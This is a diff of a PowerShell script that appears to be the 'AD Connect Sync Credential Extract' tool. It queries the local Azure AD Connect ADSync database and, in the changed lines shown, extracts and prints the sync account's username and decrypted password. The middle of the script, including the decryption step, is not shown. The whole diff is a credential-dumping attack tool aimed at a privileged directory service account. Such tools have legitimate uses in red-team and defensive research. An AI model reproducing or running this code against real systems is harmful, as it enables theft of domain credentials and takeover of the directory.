@@ -1,5 +1,4 @@
-Write-Host "AD Connect Sync Credential Extract v2 (@_xpn_)"
-Write-Host "`t[ Updated to support new cryptokey storage method ]`n"
+Write-Host "AD Connect Sync-account Credential Extract"
 
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
 
@@ -58,15 +57,13 @@ if ($decrypted -eq [string]::Empty) {
     return
 }
 
-Write-Host "$($config)"
-Write-Host "$($decrypted)"
+#Write-Host "$($config)"
+#Write-Host "$($decrypted)"
 
-#$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
-#$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
-#$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+$username = select-xml -Content $config -XPath "//parameter[@name='UserName']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
+$password = select-xml -Content $decrypted -XPath "//attribute[@name='Password']" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
 
-#Write-Host "[*] Credentials incoming...`n"
+Write-Host "[*] Credentials incoming...`n"
 
-#Write-Host "Domain: $($domain.Domain)"
-#Write-Host "Username: $($username.Username)"
-#Write-Host "Password: $($password.Password)"
+Write-Host "Username: $($username.Username)"
+Write-Host "Password: $($password.Password)"
